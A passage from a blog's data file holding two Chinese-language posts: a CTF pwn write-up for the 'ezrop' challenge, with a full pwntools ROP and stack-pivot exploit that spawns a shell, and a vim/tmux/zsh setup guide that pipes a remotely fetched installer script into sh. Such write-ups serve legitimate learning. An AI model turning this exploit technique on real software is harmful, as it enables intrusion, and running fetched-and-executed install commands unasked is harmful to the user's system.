more...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;And you must print first.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, s, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p>\n<p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p>\n<p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p>\n<h2 id=\"0x3-Process-3\">0x3 Process</h2>\n<ol>\n<li>栈迁移到data段</li>\n<li>通过rbp控制read写入位置在数据段写入ROP链</li>\n<li>getshell</li>\n</ol>\n<h2 id=\"0x4-Some-questions-2\">0x4 Some questions</h2>\n<ol>\n<li>对于这个通过rbp同时控制read位置和栈迁移的题目，我之前遇到过一次，但是当时没有做出来。调试过程中发现system一直失败，调试过程中发现原来是.got表中的dlresolve地址被改了一个字节\\0a, 一个回车，分析之后发现原来是我ret 到read了三次，第三次read把sendline的回车读取了，写到了这个位置。因为对这个分段打栈迁移的技术还不是特别熟悉，现在终于理解这个技术，其实是实现了两次栈迁移。</li>\n<li>在解决了上面的问题，调试到system发现又失败了，继续跟进，发现seg fault在dlresolve向栈中保存的指令。发现dlreslove保存寄存器要在栈里面写一大段数据，因为我写入的是data段的开头，导致访问到了前面没有写入权限的位置。这起码要预留0x800的内存在前面，但是data段和bss段加起来都没有这么多，思考data和bss段所在的这一部分内存页权限应该是一致可写的，所以在这一段往后移了0x800</li>\n</ol>\n<h2 id=\"0x5-exp-2\">0x5 exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./ezrop&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">#p = gdb.debug(<span class=\"string\">&#x27;./ezrop&#x27;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\">m = u64(p.recv(<span class=\"number\">40</span>)[<span class=\"number\">-8</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x400863</span>) + b<span class=\"number\">&#x27;</span>/bin/sh\\<span class=\"number\">0&#x27;</span> + p64(<span class=\"number\">0x400600</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads += cyclic(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span>+<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0x4007d9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x4006fa</span>) + p64(<span class=\"number\">0x400863</span>) + p64(<span class=\"number\">0x601868</span>) + p64(<span class=\"number\">0x400600</span>) </span><br><span class=\"line\">payloads += b<span class=\"number\">&#x27;</span>/bin/sh\\<span class=\"number\">0&#x27;</span></span><br><span class=\"line\">payloads += b<span class=\"number\">&#x27;</span>/bin/sh\\<span class=\"number\">0&#x27;</span></span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span><span class=\"number\">-0x8</span>) + p64(<span class=\"number\">0x4007f9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">#<span class=\"number\">0x00007f7b3ce92bb0</span>      <span class=\"number\">0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"0x6-New-skills-2\">0x6 New skills</h2>\n<ol>\n<li>分段打栈迁移\n<ul>\n<li>在第一次read读入后将rbp改为要写入的位置</li>\n<li>ret到read</li>\n<li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li>\n<li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li>\n</ul>\n</li>\n<li>dlrelsolve过程会保存大量寄存器数据，需要预留很大的栈空间</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"dlresolve-Feature-and-Segmented-stack-migration-ezrop\">dlresolve Feature and Segmented stack migration-ezrop</h1>\n<h2 id=\"0x1-checksek\">0x1 checksek</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ checksec ezrop </span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/nemo/Active/Script/ezrop&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>开了NX和partial RELRO</p>\n<h2 id=\"0x2-Analysis-3\">0x2 Analysis</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init(argc, argv, envp);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;But only overflow a bit more...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;And you must print first.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, s, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p>\n<p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p>\n<p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p>\n<h2 id=\"0x3-Process-3\">0x3 Process</h2>\n<ol>\n<li>栈迁移到data段</li>\n<li>通过rbp控制read写入位置在数据段写入ROP链</li>\n<li>getshell</li>\n</ol>\n<h2 id=\"0x4-Some-questions-2\">0x4 Some questions</h2>\n<ol>\n<li>对于这个通过rbp同时控制read位置和栈迁移的题目，我之前遇到过一次，但是当时没有做出来。调试过程中发现system一直失败，调试过程中发现原来是.got表中的dlresolve地址被改了一个字节\\0a, 一个回车，分析之后发现原来是我ret 到read了三次，第三次read把sendline的回车读取了，写到了这个位置。因为对这个分段打栈迁移的技术还不是特别熟悉，现在终于理解这个技术，其实是实现了两次栈迁移。</li>\n<li>在解决了上面的问题，调试到system发现又失败了，继续跟进，发现seg fault在dlresolve向栈中保存的指令。发现dlreslove保存寄存器要在栈里面写一大段数据，因为我写入的是data段的开头，导致访问到了前面没有写入权限的位置。这起码要预留0x800的内存在前面，但是data段和bss段加起来都没有这么多，思考data和bss段所在的这一部分内存页权限应该是一致可写的，所以在这一段往后移了0x800</li>\n</ol>\n<h2 id=\"0x5-exp-2\">0x5 exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./ezrop&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">#p = gdb.debug(<span class=\"string\">&#x27;./ezrop&#x27;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\">m = u64(p.recv(<span class=\"number\">40</span>)[<span class=\"number\">-8</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x400863</span>) + b<span class=\"number\">&#x27;</span>/bin/sh\\<span class=\"number\">0&#x27;</span> + p64(<span class=\"number\">0x400600</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads += cyclic(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span>+<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0x4007d9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x4006fa</span>) + p64(<span class=\"number\">0x400863</span>) + p64(<span class=\"number\">0x601868</span>) + p64(<span class=\"number\">0x400600</span>) </span><br><span class=\"line\">payloads += b<span class=\"number\">&#x27;</span>/bin/sh\\<span class=\"number\">0&#x27;</span></span><br><span class=\"line\">payloads += b<span class=\"number\">&#x27;</span>/bin/sh\\<span class=\"number\">0&#x27;</span></span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span><span class=\"number\">-0x8</span>) + p64(<span class=\"number\">0x4007f9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">#<span class=\"number\">0x00007f7b3ce92bb0</span>      <span class=\"number\">0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"0x6-New-skills-2\">0x6 New skills</h2>\n<ol>\n<li>分段打栈迁移\n<ul>\n<li>在第一次read读入后将rbp改为要写入的位置</li>\n<li>ret到read</li>\n<li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li>\n<li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li>\n</ul>\n</li>\n<li>dlrelsolve过程会保存大量寄存器数据，需要预留很大的栈空间</li>\n</ol>\n"},{"title":"vim+tmux+zsh+Terminal-self-discipline-of-pwner","date":"2022-04-15T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n## vim+tmux+zsh+Terminal 你的pwn效率进阶方案\n\n作为一个Pwner，需要频繁的接触命令行，特别是最近接触到了arm架构的pwn，需要一个窗口运行qemu，一个窗口跑脚本，一个窗口跑gdb，需要在几个窗口之间切换，同时我本身用sublime Text需要平凡切屏微调脚本，所以决定配置vim+tmux+zsh+terminal，实现一个兼顾美观和效率的pwn setup\n\n本文主要基于ubuntu20系统\n\n\n\n## Terminal\n\nterminal是一个终端模拟器，其实终端模拟器是什么无所谓，只是terminal我看着比较美观，再加上我的ubuntu桌面是gnome桌面，自带gnome terminal，所以我就使用terminal,  对于colors部分，背景改成灰/黑色，不透明度调到20%-30%，不影响terminal内文字的观看，同时能够看到后面的背景就行。\n\n\n\n## zsh配置方案\n\n因为后面一些配置，在有了zsh后方便一些，所以先配置zsh\n\n#### 安装\n\n- 安装zsh\n\n  ```bash\n  sudo apt-get install zsh\n  ```\n\n- 替换为默认shell\n\n  ```bash\n  sudo chsh -s /bin/zsh\n  ```\n\n  - tips: 这个命令需要重启shell(or 系统，我记不清了，先关了再开终端试一下，没有生效再重启系统吧)才能生效，所以不要像我一样以为这个命令失效了，反复发呆\n\n- 安装oh-my-zsh\n  oh-my-zsh是github上的一个开源项目，可以便捷进行zsh的插件、主题管理\n  You can find [official document](https://github.com/ohmyzsh/ohmyzsh) here\n\n  - 官方文件提供的安装方案如下\n    使用curl连接。\n    如果你没有配置代理或者改hosts的话，你大概率是安装不了的，可以使用一下国内镜像:\n\n    ```bash\n    sh -c \"$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\"\n    ```\n\n    需要先安装curl。由于我本人没有尝试过这个镜像，我本人是通过改hosts安装的，raw.fithubsercontent.con好像还没有完全屏蔽，改hosts仍然可行，如果安装失败的话，可以私我\n\n- 改配置文件\n  这个阶段，可以把文件管理器改为显示隐藏文件\n  如果你上一步安装完成，在主文件夹(也就是桌面软件的home目录，一般用~表示)会出现一个.zshrc的文件，这是zsh的配置文件，要用sudo vim写入，安装oh-my-zsh后\n\n  ```bash\n  sudo vim ~/.zshrc\n  ```\n\n  打开后应该有大量注释后文本，帮助你修改配置文本\n  \n\n​\t\t我就把ZSH_THEME改成了ys，如果有需要，可以加一些插件，改一些style，因为oh-my-zsh\t\t自带了相当多插件，怎么引入可以查看官方文档\n\n​\t\t可以使用alias命令为命令添加别名，方便使用\n​\t\t\t\n\n- 使配置文件生效\n\n  ```bash\n  source ~/.zshrc\n  ```\n\n  zsh命令行使用此命令，使配置文件生效\n\n#### 使用\n\nzsh自带了许多非常好用的功能，自动补全，智能高亮，这里我就不教怎么使用了，可以参考\n[为什么说 zsh 是 shell 中的极品？ - 知乎 (zhihu.com)](https://www.zhihu.com/question/21418449)\n\n\n\n\n\n## tmux\n\ntmux是一个终端复用软件，多用于用于分屏，在shell 键入tmux就进入了tmux，具体使用快捷键和命令请百度，此处不教怎么使用\n一个tips是tmux中的ctrl+b是一个进入命令模式的键，类似于vim的esc，所以很多快捷键写的ctrl+B+xx，意思是先按下ctrl+b，再按其他键\n\n\n\n#### 配置\n\n依旧在主文件目录下新建一个 .tmux.conf配置文件\n\n具体配置可以参考: https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.tmux.conf\n\n最后这一部分就是加入插件的，自动帮你完成了插件安装\n\n复制这个配置就行，然后在shell进入tmux\n键入:\n\n```bash\ntmux source-file ~/.tmux.conf\n```\n\n\n\n## vim\n\n如果说其他插件只是影响美观的，vim不装插件真的是跟装插件是两种软件，\n\n首先确认你安装了较新版本的vim\n\n#### 插件安装\n\n安装[vim-plug](https://github.com/junegunn/vim-plug#installation)\n\n本人亲测官网安装命令路径不咋好用，一个是不挂代理连不上，一个式官网linux的安装路径无效，我们来手动安装。\n\n- 首先复制官网的plug.vim文件\n- （如果没有）在本地主文件夹新建一个.vim文件夹，里面兴建一个autoload文件夹，将plug.vim放入\n- 再在.vim中新建一个plug目录\n\n#### 配置\n\n主文件夹新建.vimrc文件\n\n配置文件参考https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.vimrc\n\n将此处改为~/.vim/plug\n\n打开vim，按esc命令进入命令模式, 输入:  ，再用source命令导入.vimrc\n\n再在命令模式输入:PlugInstall，插件安装完成，reload，整体配置成功，具体使用网上资料很多，不再赘述","source":"_posts/vim+tmux+zsh+Terminal-self-discipline-of-pwner.md","raw":"---\ntitle: vim+tmux+zsh+Terminal-self-discipline-of-pwner\ndate: 2022-4-16\ntags: \n- Pwn\n- CTF\n\ncategories:\n- CTF\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n## vim+tmux+zsh+Terminal 你的pwn效率进阶方案\n\n作为一个Pwner，需要频繁的接触命令行，特别是最近接触到了arm架构的pwn，需要一个窗口运行qemu，一个窗口跑脚本，一个窗口跑gdb，需要在几个窗口之间切换，同时我本身用sublime Text需要平凡切屏微调脚本，所以决定配置vim+tmux+zsh+terminal，实现一个兼顾美观和效率的pwn setup\n\n本文主要基于ubuntu20系统\n\n\n\n## Terminal\n\nterminal是一个终端模拟器，其实终端模拟器是什么无所谓，只是terminal我看着比较美观，再加上我的ubuntu桌面是gnome桌面，自带gnome terminal，所以我就使用terminal,  对于colors部分，背景改成灰/黑色，不透明度调到20%-30%，不影响terminal内文字的观看，同时能够看到后面的背景就行。\n\n\n\n## zsh配置方案\n\n因为后面一些配置，在有了zsh后方便一些，所以先配置zsh\n\n#### 安装\n\n- 安装zsh\n\n  ```bash\n  sudo apt-get install zsh\n  ```\n\n- 替换为默认shell\n\n  ```bash\n  sudo chsh -s /bin/zsh\n  ```\n\n  - tips: 这个命令需要重启shell(or 系统，我记不清了，先关了再开终端试一下，没有生效再重启系统吧)才能生效，所以不要像我一样以为这个命令失效了，反复发呆\n\n- 安装oh-my-zsh\n  oh-my-zsh是github上的一个开源项目，可以便捷进行zsh的插件、主题管理\n  You can find [official document](https://github.com/ohmyzsh/ohmyzsh) here\n\n  - 官方文件提供的安装方案如下\n    使用curl连接。\n    如果你没有配置代理或者改hosts的话，你大概率是安装不了的，可以使用一下国内镜像:\n\n    ```bash\n    sh -c \"$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\"\n    ```\n\n    需要先安装curl。由于我本人没有尝试过这个镜像，我本人是通过改hosts安装的，raw.fithubsercontent.con好像还没有完全屏蔽，改hosts仍然可行，如果安装失败的话，可以私我\n\n- 改配置文件\n  这个阶段，可以把文件管理器改为显示隐藏文件\n  如果你上一步安装完成，在主文件夹(也就是桌面软件的home目录，一般用~表示)会出现一个.zshrc的文件，这是zsh的配置文件，要用sudo vim写入，安装oh-my-zsh后\n\n  ```bash\n  sudo vim ~/.zshrc\n  ```\n\n  打开后应该有大量注释后文本，帮助你修改配置文本\n  \n\n​\t\t我就把ZSH_THEME改成了ys，如果有需要，可以加一些插件，改一些style，因为oh-my-zsh\t\t自带了相当多插件，怎么引入可以查看官方文档\n\n​\t\t可以使用alias命令为命令添加别名，方便使用\n​\t\t\t\n\n- 使配置文件生效\n\n  ```bash\n  source ~/.zshrc\n  ```\n\n  zsh命令行使用此命令，使配置文件生效\n\n#### 使用\n\nzsh自带了许多非常好用的功能，自动补全，智能高亮，这里我就不教怎么使用了，可以参考\n[为什么说 zsh 是 shell 中的极品？ - 知乎 (zhihu.com)](https://www.zhihu.com/question/21418449)\n\n\n\n\n\n## tmux\n\ntmux是一个终端复用软件，多用于用于分屏，在shell 键入tmux就进入了tmux，具体使用快捷键和命令请百度，此处不教怎么使用\n一个tips是tmux中的ctrl+b是一个进入命令模式的键，类似于vim的esc，所以很多快捷键写的ctrl+B+xx，意思是先按下ctrl+b，再按其他键\n\n\n\n#### 配置\n\n依旧在主文件目录下新建一个 .tmux.conf配置文件\n\n具体配置可以参考: https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.tmux.conf\n\n最后这一部分就是加入插件的，自动帮你完成了插件安装\n\n复制这个配置就行，然后在shell进入tmux\n键入:\n\n```bash\ntmux source-file ~/.tmux.conf\n```\n\n\n\n## vim\n\n如果说其他插件只是影响美观的，vim不装插件真的是跟装插件是两种软件，\n\n首先确认你安装了较新版本的vim\n\n#### 插件安装\n\n安装[vim-plug](https://github.com/junegunn/vim-plug#installation)\n\n本人亲测官网安装命令路径不咋好用，一个是不挂代理连不上，一个式官网linux的安装路径无效，我们来手动安装。\n\n- 首先复制官网的plug.vim文件\n- （如果没有）在本地主文件夹新建一个.vim文件夹，里面兴建一个autoload文件夹，将plug.vim放入\n- 再在.vim中新建一个plug目录\n\n#### 配置\n\n主文件夹新建.vimrc文件\n\n配置文件参考https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.vimrc\n\n将此处改为~/.vim/plug\n\n打开vim，按esc命令进入命令模式, 输入:  ，再用source命令导入.vimrc\n\n再在命令模式输入:PlugInstall，插件安装完成，reload，整体配置成功，具体使用网上资料很多，不再赘述","slug":"vim+tmux+zsh+Terminal-self-discipline-of-pwner","published":1,"updated":"2022-07-15T12:00:12.690Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6majf000kj8v0gvh79n7c","content":"<h2 id=\"vim-tmux-zsh-Terminal-你的pwn效率进阶方案\">vim+tmux+zsh+Terminal 你的pwn效率进阶方案</h2>\n<p>作为一个Pwner，需要频繁的接触命令行，特别是最近接触到了arm架构的pwn，需要一个窗口运行qemu，一个窗口跑脚本，一个窗口跑gdb，需要在几个窗口之间切换，同时我本身用sublime Text需要平凡切屏微调脚本，所以决定配置vim+tmux+zsh+terminal，实现一个兼顾美观和效率的pwn setup</p>\n<p>本文主要基于ubuntu20系统</p>\n<h2 id=\"Terminal\">Terminal</h2>\n<p>terminal是一个终端模拟器，其实终端模拟器是什么无所谓，只是terminal我看着比较美观，再加上我的ubuntu桌面是gnome桌面，自带gnome terminal，所以我就使用terminal,  对于colors部分，背景改成灰/黑色，不透明度调到20%-30%，不影响terminal内文字的观看，同时能够看到后面的背景就行。</p>\n<h2 id=\"zsh配置方案\">zsh配置方案</h2>\n<p>因为后面一些配置，在有了zsh后方便一些，所以先配置zsh</p>\n<h4 id=\"安装\">安装</h4>\n<ul>\n<li>\n<p>安装zsh</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install zsh</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>替换为默认shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>\n<ul>\n<li>tips: 这个命令需要重启shell(or 系统，我记不清了，先关了再开终端试一下，没有生效再重启系统吧)才能生效，所以不要像我一样以为这个命令失效了，反复发呆</li>\n</ul>\n</li>\n<li>\n<p>安装oh-my-zsh<br>\noh-my-zsh是github上的一个开源项目，可以便捷进行zsh的插件、主题管理<br>\nYou can find <a href=\"https://github.com/ohmyzsh/ohmyzsh\">official document</a> here</p>\n<ul>\n<li>\n<p>官方文件提供的安装方案如下<br>\n使用curl连接。<br>\n如果你没有配置代理或者改hosts的话，你大概率是安装不了的，可以使用一下国内镜像:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n<p>需要先安装curl。由于我本人没有尝试过这个镜像，我本人是通过改hosts安装的，raw.fithubsercontent.con好像还没有完全屏蔽，改hosts仍然可行，如果安装失败的话，可以私我</p>\n</li>\n</ul>\n</li>\n<li>\n<p>改配置文件<br>\n这个阶段，可以把文件管理器改为显示隐藏文件<br>\n如果你上一步安装完成，在主文件夹(也就是桌面软件的home目录，一般用~表示)会出现一个.zshrc的文件，这是zsh的配置文件，要用sudo vim写入，安装oh-my-zsh后</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim ~/.zshrc</span><br></pre></td></tr></table></figure>\n<p>打开后应该有大量注释后文本，帮助你修改配置文本</p>\n</li>\n</ul>\n<p>​\t\t我就把ZSH_THEME改成了ys，如果有需要，可以加一些插件，改一些style，因为oh-my-zsh\t\t自带了相当多插件，怎么引入可以查看官方文档</p>\n<p>​\t\t可以使用alias命令为命令添加别名，方便使用<br>\n​</p>\n<ul>\n<li>\n<p>使配置文件生效</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>\n<p>zsh命令行使用此命令，使配置文件生效</p>\n</li>\n</ul>\n<h4 id=\"使用\">使用</h4>\n<p>zsh自带了许多非常好用的功能，自动补全，智能高亮，这里我就不教怎么使用了，可以参考<br>\n<a href=\"https://www.zhihu.com/question/21418449\">为什么说 zsh 是 shell 中的极品？ - 知乎 (zhihu.com)</a></p>\n<h2 id=\"tmux\">tmux</h2>\n<p>tmux是一个终端复用软件，多用于用于分屏，在shell 键入tmux就进入了tmux，具体使用快捷键和命令请百度，此处不教怎么使用<br>\n一个tips是tmux中的ctrl+b是一个进入命令模式的键，类似于vim的esc，所以很多快捷键写的ctrl+B+xx，意思是先按下ctrl+b，再按其他键</p>\n<h4 id=\"配置\">配置</h4>\n<p>依旧在主文件目录下新建一个 .tmux.conf配置文件</p>\n<p>具体配置可以参考: <a href=\"https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.tmux.conf\">https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.tmux.conf</a></p>\n<p>最后这一部分就是加入插件的，自动帮你完成了插件安装</p>\n<p>复制这个配置就行，然后在shell进入tmux<br>\n键入:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmux source-file ~/.tmux.conf</span><br></pre></td></tr></table></figure>\n<h2 id=\"vim\">vim</h2>\n<p>如果说其他插件只是影响美观的，vim不装插件真的是跟装插件是两种软件，</p>\n<p>首先确认你安装了较新版本的vim</p>\n<h4 id=\"插件安装\">插件安装</h4>\n<p>安装<a href=\"https://github.com/junegunn/vim-plug#installation\">vim-plug</a></p>\n<p>本人亲测官网安装命令路径不咋好用，一个是不挂代理连不上，一个式官网linux的安装路径无效，我们来手动安装。</p>\n<ul>\n<li>首先复制官网的plug.vim文件</li>\n<li>（如果没有）在本地主文件夹新建一个.vim文件夹，里面兴建一个autoload文件夹，将plug.vim放入</li>\n<li>再在.vim中新建一个plug目录</li>\n</ul>\n<h4 id=\"配置-2\">配置</h4>\n<p>主文件夹新建.vimrc文件</p>\n<p>配置文件参考https://github.com/YashdalfTheGray/dotfiles/blob/master/macos/.vimrc</p>\n<p>将此处改为~/.vim/plug</p>\n<p>打开vim，按esc命令进入命令模式, 输入:  ，再用source命令导入.vimrc</p>\n<p>再在命令模式输入:PlugInstall，插件安装完成，reload，整体配置成功，具体使用网上资料很多，不再赘述</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"vim-tmux-zsh-Terminal-你的pwn效率进阶方案\">vim+tmux+zsh+Terminal 你的pwn效率进阶方案</h2>\n<p>作为一个Pwner，需要频繁的接触命令行，特别是最近接触到了arm架构的pwn，需要一个窗口运行qemu，一个窗口跑脚本，一个窗口跑gdb，需要在几个窗口之间切换，同时我本身用sublime Text需要平凡切屏微调脚本，所以决定配置vim+tmux+zsh+terminal，实现一个兼顾美观和效率的pwn setup</p>\n<p>本文主要基于ubuntu20系统</p>\n<h2 id=\"Terminal\">Terminal</h2>\n<p>terminal是一个终端模拟器，其实终端模拟器是什么无所谓，只是terminal我看着比较美观，再加上我的ubuntu桌面是gnome桌面，自带gnome terminal，所以我就使用terminal,  